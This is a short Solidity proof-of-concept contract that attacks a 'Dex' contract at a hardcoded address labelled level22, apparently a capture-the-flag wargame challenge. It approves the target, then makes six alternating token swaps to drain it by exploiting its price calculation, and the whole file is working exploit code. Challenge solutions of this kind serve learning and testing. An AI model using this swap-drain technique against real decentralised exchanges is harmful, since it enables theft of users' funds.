// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./dex.sol";

contract POC {

    Dex level22 = Dex(0xBF9c44F413901ad433411053fAB2B92809e548E1);
    function run() external{
        level22.approve(address(level22), 1000);
        address token1 = level22.token1();
        address token2 = level22.token2();

        level22.swap(token1, token2, 10);
        level22.swap(token2, token1, 20);
        level22.swap(token1, token2, 24);
        level22.swap(token2, token1, 30);
        level22.swap(token1, token2, 41);
        level22.swap(token2, token1, 45);

    }
}